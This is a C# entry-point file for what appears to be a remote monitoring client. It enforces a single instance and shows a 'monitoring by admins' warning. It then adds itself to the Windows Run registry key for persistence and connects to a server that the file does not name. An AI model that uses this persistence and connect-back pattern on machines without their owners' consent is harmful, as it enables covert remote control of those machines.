using Client.Network;
using Client.Utils;
using Microsoft.Win32;
using PacketLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    internal class Program
    {
       
        static void Main(string[] args)
        {
            if (!MutexControl.CreateMutex())
                Environment.Exit(0);
            var t = new Thread(() =>
            {
                Thread.Sleep(3000);
                MessageBox.Show("Your under monitoring by admins.", "!!! Warning !!!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            });
            t.IsBackground = true;
            t.Start();
            if (Settings.AppStartup)
            {
                var registrykey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
                registrykey.SetValue(Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location), "\"" + Assembly.GetExecutingAssembly().Location + "\"");
                registrykey.Close();
            }
            _Client.Connect();
        }
    }
}
